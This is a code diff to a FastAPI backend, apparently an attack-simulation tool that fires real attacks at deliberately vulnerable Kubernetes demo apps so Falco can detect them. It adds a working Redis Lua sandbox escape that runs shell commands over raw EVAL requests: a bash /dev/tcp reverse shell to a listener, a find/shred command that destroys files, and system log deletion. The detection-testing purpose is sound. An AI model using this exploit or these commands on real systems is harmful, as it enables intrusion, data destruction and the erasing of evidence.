@@ -1,7 +1,9 @@
 from fastapi import APIRouter, HTTPException
 import os
 import re
+import socket
 import sys
+from urllib.parse import urlparse
 from models.simulation_info import SimulationInfo
 from requests import exceptions as requests_exceptions
 from utils.k8s_client import k8s_client
@@ -15,9 +17,12 @@ DEFAULT_SIMULATION_TARGET_URL = "http://10.0.0.29:30081"
 DEFAULT_TARGET_URL = (os.getenv("SIMULATION_TARGET_URL", DEFAULT_SIMULATION_TARGET_URL) or DEFAULT_SIMULATION_TARGET_URL).rstrip("/")
 DEFAULT_REVERSE_SHELL_LISTENER_IP = os.getenv("SIMULATION_LISTENER_IP", "10.0.0.180")
 DEFAULT_REVERSE_SHELL_LISTENER_PORT = os.getenv("SIMULATION_LISTENER_PORT", "4444")
-SUPPORTED_APP_PREFIX = "vuln-spring"
-VULN_SPRING_SERVICE_NAME = "vuln-spring"
-VULN_SPRING_NAMESPACES = ("istio-enabled", "default")
+SUPPORTED_APP_PREFIXES = ("vuln-spring", "vuln-redis")
+VULN_SERVICE_NAMES = {
+    "vuln-spring": "vuln-spring",
+    "vuln-redis": "vuln-redis",
+}
+VULN_NAMESPACES = ("istio-enabled", "default")
 
 # Every simulated attack performs an action that Falco picks up with a specific default
 # rule. We keep this mapping authoritative on the backend so the UI and the user understand
@@ -29,6 +34,15 @@ ATTACK_FALCO_RULES: dict[str, str] = {
 }
 SUPPORTED_ATTACK_TYPES = set(ATTACK_FALCO_RULES.keys())
 
+REDIS_LUA_ESCAPE_TEMPLATE = (
+    'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); '
+    'local io = io_l(); '
+    'local f = io.popen("{payload}", "r"); '
+    'local res = f:read("*a"); '
+    'f:close(); '
+    'return res'
+)
+
 
 def _env_override_for_cluster(cluster: str) -> str | None:
     """Allow operators to pin a target URL per cluster via env (e.g. SIMULATION_TARGET_URL_CLUSTER1)."""
@@ -39,11 +53,18 @@ def _env_override_for_cluster(cluster: str) -> str | None:
     return value.rstrip("/") if value else None
 
 
-def _find_vuln_spring_nodeport(client_api, namespaces: tuple[str, ...] = VULN_SPRING_NAMESPACES):
-    """Locate the vuln-spring Service in the cluster and return (namespace, nodePort)."""
+def _app_prefix(app_name: str) -> str | None:
+    for prefix in SUPPORTED_APP_PREFIXES:
+        if app_name.startswith(prefix):
+            return prefix
+    return None
+
+
+def _find_vuln_nodeport(client_api, service_name: str, namespaces: tuple[str, ...] = VULN_NAMESPACES):
+    """Locate a vulnerable app Service in the cluster and return (namespace, nodePort)."""
     for namespace in namespaces:
         try:
-            svc = client_api.read_namespaced_service(name=VULN_SPRING_SERVICE_NAME, namespace=namespace)
+            svc = client_api.read_namespaced_service(name=service_name, namespace=namespace)
         except Exception:
             continue
         for port in (svc.spec.ports or []):
@@ -74,8 +95,8 @@ def _pick_node_address(client_api) -> str | None:
     return None
 
 
-def _resolve_target_url(cluster: str | None) -> tuple[str, dict]:
-    """Resolve the vuln-spring attack URL for the given cluster.
+def _resolve_target(cluster: str | None, app_prefix: str) -> tuple[str, dict]:
+    """Resolve the attack target for the given vulnerable app and cluster.
 
     Resolution order:
       1) env override SIMULATION_TARGET_URL_<CLUSTER>
@@ -93,13 +114,14 @@ def _resolve_target_url(cluster: str | None) -> tuple[str, dict]:
         except Exception as exc:
             raise HTTPException(status_code=400, detail=f"Unknown cluster: {cluster} ({exc})") from exc
 
-        namespace, node_port = _find_vuln_spring_nodeport(client_api)
+        service_name = VULN_SERVICE_NAMES[app_prefix]
+        namespace, node_port = _find_vuln_nodeport(client_api, service_name)
         if not node_port:
             raise HTTPException(
                 status_code=404,
                 detail=(
-                    f"Service '{VULN_SPRING_SERVICE_NAME}' with a NodePort not found in "
-                    f"{'/'.join(VULN_SPRING_NAMESPACES)} on cluster '{cluster}'"
+                    f"Service '{service_name}' with a NodePort not found in "
+                    f"{'/'.join(VULN_NAMESPACES)} on cluster '{cluster}'"
                 ),
             )
         node_ip = _pick_node_address(client_api)
@@ -108,7 +130,8 @@ def _resolve_target_url(cluster: str | None) -> tuple[str, dict]:
                 status_code=503,
                 detail=f"No Ready node with a routable address found on cluster '{cluster}'",
             )
-        return f"http://{node_ip}:{node_port}", {
+        scheme = "redis" if app_prefix == "vuln-redis" else "http"
+        return f"{scheme}://{node_ip}:{node_port}", {
             "source": "auto_discovery",
             "cluster": cluster,
             "namespace": namespace,
@@ -127,7 +150,7 @@ def _find_running_pod(cluster: str, namespace: str | None, app_name: str) -> str
         client_api = k8s_client.get_client(cluster)
     except Exception:
         return None
-    namespaces = [namespace] if namespace else list(VULN_SPRING_NAMESPACES)
+    namespaces = [namespace] if namespace else list(VULN_NAMESPACES)
     for ns in namespaces:
         try:
             pods = client_api.list_namespaced_pod(namespace=ns, label_selector=f"app={app_name}")
@@ -139,6 +162,63 @@ def _find_running_pod(cluster: str, namespace: str | None, app_name: str) -> str
     return None
 
 
+def _redis_endpoint(target: str) -> tuple[str, int]:
+    parsed = urlparse(target if "://" in target else f"redis://{target}")
+    host = parsed.hostname
+    port = parsed.port or 6379
+    if not host:
+        raise HTTPException(status_code=400, detail=f"Could not parse Redis target: {target}")
+    return host, port
+
+
+def _redis_resp_bulk(value: str) -> bytes:
+    data = value.encode("utf-8")
+    return b"$" + str(len(data)).encode("ascii") + b"\r\n" + data + b"\r\n"
+
+
+def _redis_eval_command(host: str, port: int, shell_command: str) -> str:
+    payload = shell_command.replace("\\", "\\\\").replace('"', '\\"')
+    script = REDIS_LUA_ESCAPE_TEMPLATE.format(payload=payload)
+    request = b"*3\r\n" + _redis_resp_bulk("EVAL") + _redis_resp_bulk(script) + _redis_resp_bulk("0")
+    try:
+        with socket.create_connection((host, port), timeout=5) as sock:
+            sock.settimeout(10)
+            sock.sendall(request)
+            chunks = []
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                chunks.append(chunk)
+                if len(chunk) < 4096:
+                    break
+    except OSError as exc:
+        raise HTTPException(status_code=502, detail=f"Redis simulation target unreachable at {host}:{port}: {exc}") from exc
+    response = b"".join(chunks).decode("utf-8", errors="replace")
+    if response.startswith("-"):
+        raise HTTPException(status_code=502, detail=f"Redis exploit command failed: {response.strip()}")
+    return response
+
+
+def _redis_attack(target: str, attack_type: str) -> str:
+    host, port = _redis_endpoint(target)
+    _redis_eval_command(host, port, "whoami")
+    if attack_type == "reverse_shell":
+        command = f"bash -c 'exec bash -i &>/dev/tcp/{DEFAULT_REVERSE_SHELL_LISTENER_IP}/{DEFAULT_REVERSE_SHELL_LISTENER_PORT} <&1'"
+        message = "Redis reverse shell command executed"
+    elif attack_type == "data_destruction":
+        command = "find / -type f ! -path '/tmp/*' ! -path '/etc/*' ! -path '/lib/*' -exec shred -u -n 3 {} \\;"
+        message = "Redis data destruction command executed"
+    else:
+        command = "rm -f /var/log/*.log /var/log/*/*.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null || true"
+        message = "Redis log removal command executed"
+    _redis_eval_command(host, port, command)
+    return message
+
+
 @router.get("/attack-mapping")
 def get_attack_mapping():
     """Expose the static attack -> Falco rule mapping for the frontend."""
@@ -146,13 +226,14 @@ def get_attack_mapping():
         "mapping": [
             {"attackType": attack, "falcoRule": rule}
             for attack, rule in ATTACK_FALCO_RULES.items()
-        ]
+        ],
+        "supportedAppPrefixes": list(SUPPORTED_APP_PREFIXES),
     }
 
 
 @router.post("")
 def simulate(simInfo: SimulationInfo):
-    """Trigger a real attack against the vuln-spring NodePort on the chosen cluster.
+    """Trigger a real attack against a vulnerable demo app NodePort on the chosen cluster.
 
     Migration is **not** triggered here anymore. Falco running on the cluster detects the
     attack and posts an alert to /alert, which then consults config.json to decide
@@ -170,27 +251,35 @@ def simulate(simInfo: SimulationInfo):
         raise HTTPException(status_code=400, detail="attackType is required")
     if attack_type not in SUPPORTED_ATTACK_TYPES:
         raise HTTPException(status_code=400, detail=f"Unsupported attackType: {attack_type}")
-    if not app_name.startswith(SUPPORTED_APP_PREFIX):
+    app_prefix = _app_prefix(app_name)
+    if not app_prefix:
         raise HTTPException(
             status_code=400,
-            detail=f"Simulation currently supports only apps starting with '{SUPPORTED_APP_PREFIX}'. Received '{app_name}'."
+            detail=(
+                "Simulation currently supports only apps starting with "
+                f"{', '.join(SUPPORTED_APP_PREFIXES)}. Received '{app_name}'."
+            )
         )
 
     falco_rule = ATTACK_FALCO_RULES[attack_type]
-    target_url, target_meta = _resolve_target_url(cluster)
+    target_url, target_meta = _resolve_target(cluster, app_prefix)
     resolved_namespace = namespace or target_meta.get("namespace")
     pod_name = _find_running_pod(cluster, resolved_namespace, app_name) if cluster else None
 
     try:
-        if attack_type == "reverse_shell":
-            reverse_shell(target_url, DEFAULT_REVERSE_SHELL_LISTENER_IP, DEFAULT_REVERSE_SHELL_LISTENER_PORT)
-            simulation_message = "Reverse shell command executed"
-        elif attack_type == "data_destruction":
-            data_destruction(target_url)
-            simulation_message = "Data destruction command executed"
+        if app_prefix == "vuln-redis":
+            simulation_message = _redis_attack(target_url, attack_type)
         else:
-            log_removal(target_url)
-            simulation_message = "Log removal command executed"
+            http_target_url = target_url.replace("redis://", "http://", 1)
+            if attack_type == "reverse_shell":
+                reverse_shell(http_target_url, DEFAULT_REVERSE_SHELL_LISTENER_IP, DEFAULT_REVERSE_SHELL_LISTENER_PORT)
+                simulation_message = "Reverse shell command executed"
+            elif attack_type == "data_destruction":
+                data_destruction(http_target_url)
+                simulation_message = "Data destruction command executed"
+            else:
+                log_removal(http_target_url)
+                simulation_message = "Log removal command executed"
 
         return {
             "message": simulation_message,
